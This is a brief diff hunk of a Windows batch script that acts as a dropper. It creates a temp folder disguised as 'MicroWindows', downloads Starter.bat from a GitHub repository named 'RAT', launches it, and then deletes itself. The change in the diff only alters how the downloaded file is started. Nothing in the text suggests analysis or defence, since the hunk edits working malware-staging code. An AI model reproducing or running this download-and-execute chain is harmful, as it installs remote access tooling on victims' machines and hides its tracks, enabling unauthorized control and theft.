@@ -5,6 +5,6 @@ mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
 set "targetd=C:\Users\%username%\AppData\Local\Temp\MicroWindows"
 cd %targetd%
 powershell powershell.exe "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
-Starter.bat
+start "" Starter.bat
 cd %currentd%
 del "%~f0"
